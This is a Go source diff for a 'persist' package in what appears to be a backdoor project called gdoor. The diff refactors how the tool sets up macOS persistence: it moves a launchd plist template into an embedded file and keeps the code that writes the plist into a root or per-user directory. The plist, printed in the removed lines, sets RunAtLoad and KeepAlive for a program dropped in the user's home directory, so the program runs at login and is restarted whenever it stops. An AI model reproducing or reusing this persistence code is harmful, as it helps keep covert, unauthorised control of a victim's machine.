@@ -1,6 +1,7 @@
 package persist
 
 import (
+	_ "embed"
 	"fmt"
 	"io/ioutil"
 	"os"
@@ -11,26 +12,11 @@ import (
 	"gdoor/info"
 )
 
-func setPlist(i *info.Info) {
-	plist_fmt := `<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-  <key>Label</key>
-  <string>%s</string>
-  <key>ProgramArguments</key>
-  <array>
-    <string>%s</string>
-  </array>
-  <key>RunAtLoad</key>
-  <true/>
-  <key>KeepAlive</key>
-  <true/>
-</dict>
-</plist>
-`
+//go:embed plist.tmpl
+var plistFmt string
 
-	plist := fmt.Sprintf(plist_fmt, config.PlistName, filepath.Join(i.GetHomePath(), config.TargetDir, config.TargetName))
+func setPlist(i *info.Info) {
+	plist := fmt.Sprintf(plistFmt, config.PlistName, filepath.Join(i.GetHomePath(), config.TargetDir, config.TargetName))
 
 	plistDir := config.RPlistDir
 	if i.GetCurUser() != "root" {
